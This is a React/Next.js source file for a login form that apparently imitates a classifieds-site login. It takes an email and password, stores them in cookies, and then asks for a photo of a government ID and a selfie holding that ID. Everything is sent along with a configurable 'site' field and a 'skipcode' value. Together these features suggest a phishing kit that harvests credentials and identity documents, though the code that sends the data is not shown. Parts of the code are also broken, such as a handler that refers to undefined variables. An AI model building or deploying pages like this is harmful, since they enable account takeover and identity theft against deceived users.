import { useCallback, useEffect, useRef, useState } from "react";
import { Field, Form, Formik } from "formik";
import ReCAPTCHA from "react-google-recaptcha";
import { site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
import Cookies from "js-cookie";
import { useRouter } from "next/router";
import XIcon from "./XIcon";
import AngleLeft from "./AngleLeftIcon";
import Image from "next/image";
import CheckIcon from "./CheckIcon";
import Webcam from "react-webcam";
import { toast } from "react-toastify";
import PhotoUpload from "./PhotoUpload";

function LoginForm() {
  const [verified, setVerified] = useState(false);
  const [showModal, setShowModal] = useState(false);
  // const [showCamera, setShowCamera] = useState("");

  // const [onlyCardUrl, setOnlyCardUrl] = useState("");
  // const [holdingCardUrl, setHoldingCardUrl] = useState("");
  // const onlyCardCamRef = useRef(null);
  // const holdingCardCamRef = useRef(null);

  // const [imageSrc, setImageSrc] = useState("");

  const router = useRouter();

  // const videoConstraints = {
  //   width: 1280,
  //   height: 720,
  //   facingMode: "user",
  // };

  const initialvalues = {
    email: "",
    password: "",
  };

  const { login } = useMockLogin();

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;
    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
      onlyCard: "",
      holdingCard: "",
    };

    // Cookies.set("site", site);
    // Cookies.set("email", email);
    // Cookies.set("password", password);

    // setShowModal(true);

    const allValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
      onlyCard: Cookies.get("onlyCard"),
      holdingCard: Cookies.get("holdingCard"),
    };

    login(allValues, formik, setShowModal);

    // console.log("allValues", allValues);

    // Cookies.remove("email");
    // Cookies.remove("password");
    // Cookies.remove("onlyCard");
    // Cookies.remove("holdingCard");

    // setShowModal(false);
    // formik.resetForm();
    // toast.success("Login Successfull");
  };

  const handleNextStep = () => {
    Cookies.set("email", email);
    Cookies.set("password", password);

    setShowModal(true);
  };

  const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
  // const captchaKeyProd = "6LdM_9MiAAAAAJpk2F0ZDaWmIv0BfTfMKChH7AGL";
  const captchaKeyProd = "6Lck0YUjAAAAANYCIMzWXamx6oD5pRnwwKszARPR";

  const recaptchaKey =
    process.env.NODE_ENV !== "development" ? captchaKeyProd : captchaKeyDev;

  // const handleOnlyCard = useCallback(() => {
  //   const imageSrc = onlyCardCamRef.current.getScreenshot();
  //   // setImageSrc(imageSrc);
  //   // const demoUrl = URL.createObjectURL(imageSrc);
  //   const demoUrl = imageSrc;
  //   setOnlyCardUrl(demoUrl);
  //   Cookies.set("onlyCard", demoUrl);
  //   setShowCamera("");
  // }, [onlyCardCamRef]);

  // const handleHoldingCard = useCallback(() => {
  //   const imageSrc = holdingCardCamRef.current.getScreenshot();
  //   // setImageSrc(imageSrc);
  //   // const demoUrl = URL.createObjectURL(imageSrc);
  //   const demoUrl = imageSrc;
  //   setHoldingCardUrl(demoUrl);
  //   Cookies.set("holdingCard", demoUrl);
  //   setShowCamera("");
  // }, [holdingCardCamRef]);

  // // useEffect(() => {
  // //   console.log("image src", imageSrc);
  // // }, [imageSrc]);

  // const handleAllSubmit = async () => {
  //   const allValues = {
  //     site: site,
  //     email: Cookies.get("email"),
  //     password: Cookies.get("password"),
  //     skipcode: "",
  //     onlyCard: Cookies.get("onlyCard"),
  //     holdingCard: Cookies.get("holdingCard"),
  //   };

  //   console.log("allValues", allValues);

  //   Cookies.remove("email");
  //   Cookies.remove("password");
  //   Cookies.remove("onlyCard");
  //   Cookies.remove("holdingCard");

  //   setShowModal(false);
  //   toast.success("Login Successfull");
  // };

  return (
    <div className="">
      <div className="mt-[50px] flex flex-col items-center">
        <p className="text-custom-gray2 text-lg">
          Is this your first time posting?
        </p>
        <button className="mt-[8px] bg-custom-blue3 px-[57px] text-[24px] text-white font-semibold tracking-[2px] rounded">
          Start Here
        </button>

        <p className=" mt-[40px] text-custom-gray2 text-lg">
          Already have a login?
        </p>
        <p className="text-custom-gray2 text-[25px]">Login</p>
      </div>

      <div className="mt-1">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="mx-[30px]">
              <div className="space-y-[9px]">
                <Field
                  placeholder="Email"
                  className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="email"
                  name="email"
                  required
                />
                <Field
                  placeholder="Password"
                  className="w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="password"
                  name="password"
                  type="password"
                  autoComplete="on"
                  required
                />
              </div>
              <div className="flex flex-col items-center">
                <ReCAPTCHA
                  className="mt-[35px]"
                  sitekey={recaptchaKey}
                  onChange={() => setVerified(true)}
                />
                <button
                  // type="submit"
                  type="button"
                  className="mt-[20px] bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                  disabled={!verified}
                  onClick={handleNextStep}
                >
                  Submit
                </button>
              </div>

              {showModal && <PhotoUpload setShowModal={setShowModal} />}
            </Form>
          )}
        </Formik>
      </div>

      <p className="mt-[10px] text-center text-sm text-custom-blue2 hover:underline">
        Forgot Password
      </p>

      {/* {showModal && (
        <div className="absolute inset-0 bg-black/40 h-screen">
          <div className="flex flex-col justify-center items-center h-full">
            <div className="md:w-[450px] min-h-[500px] rounded-md bg-white shadow-md overflow-hidden ">
              <div className="py-3.5 px-5 bg-gray-200 flex justify-between items-center">
                <button
                  type="button"
                  onClick={() => {
                    setShowModal(false), setShowCamera("onlyCard");
                  }}
                >
                  <AngleLeft />
                </button>

                <p className="text-center  capitalize text-sm font-semibold text-gray-500">
                  NEED HELP?
                </p>
                <button
                  type="button"
                  onClick={() => {
                    setShowModal(false);
                    setShowCamera(false);
                  }}
                >
                  <XIcon />
                </button>
              </div>
              {!showCamera ? (
                <div className="mx-8 my-6 flex flex-col items-center gap-5">
                  <h1 className="text-[22px] font-semibold uppercase text-gray-700">
                    PHOTO UPLOAD
                  </h1>

                  <div className="relative w-[160px] h-[90px]">
                    {!onlyCardUrl && (
                      <Image
                        src="/images/id-photo-1.jpg"
                        fill
                        className="object-cover"
                      />
                    )}

                    {onlyCardUrl && !holdingCardUrl && (
                      <Image
                        src="/images/id-photo-2.jpg"
                        fill
                        className="object-cover object-center"
                      />
                    )}
                  </div>

                  <div className="mt-8">
                    <div
                      className={`flex items-center gap-3 ${
                        onlyCardUrl && "opacity-50"
                      }`}
                    >
                      <span className="bg-gray-800 text-white rounded-full h-10 w-10 text-lg flex justify-center items-center">
                        {!onlyCardUrl ? 1 : <CheckIcon />}
                      </span>

                      <p className="flex-1 text-sm">
                        Upload or take a photo of your GOVERNMENT ID on a flat
                        surface.
                      </p>
                    </div>

                    {!onlyCardUrl && (
                      <button
                        type="button"
                        className="mt-6 w-full bg-[#0552AA] text-white text-sm font-semibold py-3 uppercase"
                        onClick={() => setShowCamera("onlyCard")}
                      >
                        TAKE PHOTO OF ID
                      </button>
                    )}
                  </div>

                  <div className="mt-8">
                    <div
                      className={`flex items-center gap-3 ${
                        (!onlyCardUrl || holdingCardUrl) && "opacity-50"
                      }`}
                    >
                      <span className="bg-gray-800 text-white rounded-full h-10 w-10 text-lg flex justify-center items-center">
                        {!holdingCardUrl ? 2 : <CheckIcon />}
                      </span>
                     
                      <p className="flex-1 text-sm">
                        Upload or take a selfie of your GOVERNMENT ID close to
                        your face.
                      </p>
                    </div>

                    {onlyCardUrl && !holdingCardUrl && (
                      <button
                        type="button"
                        className="mt-6 w-full bg-[#0552AA] text-white text-sm font-semibold py-3 uppercase"
                        onClick={() => setShowCamera("holdingCard")}
                      >
                        TAKE SELFIE WITH ID
                      </button>
                    )}
                  </div>

                  {onlyCardUrl && holdingCardUrl && (
                    <button
                      className="mt-3 text-white text-sm font-medium bg-blue-600 py-3 px-8 uppercase"
                      onClick={handleAllSubmit}
                    >
                      SUBMIT
                    </button>
                  )}
                </div>
              ) : (  
                <>
                  {showCamera === "onlyCard" && (
                    <>
                      <Webcam
                        ref={onlyCardCamRef}
                        audio={false}
                        screenshotFormat="image/jpeg"
                        // height={720}
                        // width={1280}
                        // videoConstraints={videoConstraints}
                      />
                      <button
                        className="mt-3 mx-auto flex justify-center px-6 py-2 text-sm font-medium bg-blue-600 text-white"
                        onClick={handleOnlyCard}
                      >
                        Take Photo
                      </button>
                    </>
                  )}
                  {showCamera === "holdingCard" && (
                    <>
                      <Webcam
                        ref={holdingCardCamRef}
                        audio={false}
                        screenshotFormat="image/jpeg"
                        // height={720}
                        // width={1280}
                        // videoConstraints={videoConstraints}
                      />
                      <button
                        className="mt-3 mx-auto flex justify-center px-6 py-2 text-sm font-medium bg-blue-600 text-white"
                        onClick={handleHoldingCard}
                      >
                        Take Photo
                      </button>
                    </>
                  )}
                </>
              )}
            </div>
            <div className="mt-3 font-bold text-lg italic">Hold tight...</div>
          </div>
        </div>
      )} */}
    </div>
  );
}

export default LoginForm;
